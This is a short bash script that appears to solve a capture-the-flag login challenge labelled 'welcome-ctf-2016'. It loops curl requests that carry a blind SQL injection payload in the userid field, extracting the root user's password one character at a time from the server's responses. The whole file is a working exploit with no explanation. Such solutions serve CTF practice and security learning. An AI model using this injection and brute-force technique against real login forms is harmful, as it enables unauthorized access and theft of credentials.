#!/usr/bin/bash
s=
found=
while [ -z "$found" ] ; do
    for c in {a..z} ; do
        if curl /path/to/welcome-ctf-2016/problem/login.php -F userid="' or ( id = 'root' and password like '$s$c%' ) --" -F password= -F login=login 2>/dev/null | grep -q 'something wrong' ; then
            s=$s$c
            echo $s
            break
        fi
        if [ $c = z ] ; then
            found=t
        fi
    done
done
